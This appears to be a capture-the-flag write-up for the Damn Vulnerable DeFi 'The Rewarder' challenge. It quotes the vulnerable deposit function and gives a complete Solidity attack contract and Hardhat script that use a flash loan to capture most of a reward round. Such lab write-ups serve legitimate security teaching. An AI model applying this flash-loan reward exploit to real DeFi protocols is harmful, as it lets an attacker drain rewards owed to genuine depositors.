## GOAL
You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

## Examining the code
Inorder to receive the reward we must depost since in the function deposit we have the function distributeRewards
```solidity
 function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards(); //here is the function

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }
```

## Exploit
Since we have a lending pool, we can make a flashLoan and deposit in the TheRewarderPool.sol, so the distributeRewards will be called,once called we got the reward and it is time to return the funds and get back the rewards.

## Solution
```solidity
contract AttackReward{

    FlashLoanerPool pool;
    TheRewarderPool theRewardPool;
    DamnValuableToken public immutable liquidityToken;
    address payable owner;

    constructor(address _pool,address _liquidityToken,address _theRewardPool,address payable _owner)
    {
        pool = FlashLoanerPool(_pool);
        theRewardPool = TheRewarderPool(_theRewardPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        owner = _owner;
    }

    function attack(uint256 amount) external
    {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external{

        // approve contract to transfer our token
        liquidityToken.approve(address(theRewardPool), amount);

        //deposit to enter the distribute
        theRewardPool.deposit(amount);

        //getting backtokens to return funds
        theRewardPool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);

        //getting the reward
        theRewardPool.rewardToken().transfer(owner,theRewardPool.rewardToken().balanceOf(address(this)));
    } 
}
```

```javascript
const AttackRewardFactory = await ethers.getContractFactory("AttackReward",attacker);
const attackerContract = await AttackRewardFactory.deploy(
this.flashLoanPool.address,
this.liquidityToken.address,
this.rewarderPool.address,
attacker.address
) 

await ethers.provider.send("evm_increaseTime",[5*24*60*60]);
await attackerContract.attack(TOKENS_IN_LENDER_POOL);
```